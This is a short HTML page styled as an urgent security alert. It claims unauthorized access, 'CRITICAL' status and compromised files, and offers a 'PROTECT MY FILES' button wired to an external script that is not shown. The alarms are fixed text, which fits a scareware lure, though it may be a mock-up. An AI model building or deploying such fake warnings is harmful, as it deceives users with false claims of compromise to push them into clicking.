<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Protect Your Files</title>

    <link rel="stylesheet" href="protect.css">
</head>

<body>

    <div class="warning-screen">

        <div class="warning-box">

            <div class="warning-icon">
                ⚠
            </div>

            <h1>YOUR FILES ARE AT RISK</h1>

            <p class="main-text">
                Unauthorized access detected.
            </p>

            <p class="sub-text">
                Your personal files may be transferred.
                Immediate action is recommended.
            </p>

            <div class="status">

                <div>
                    STATUS:
                    <span>CRITICAL</span>
                </div>

                <div>
                    SECURITY:
                    <span>COMPROMISED</span>
                </div>

                <div>
                    FILES:
                    <span>AT RISK</span>
                </div>

            </div>

            <button id="protectBtn">
                🔒 PROTECT MY FILES
            </button>

        </div>

    </div>

    <script src="protect.js"></script>

</body>

</html>
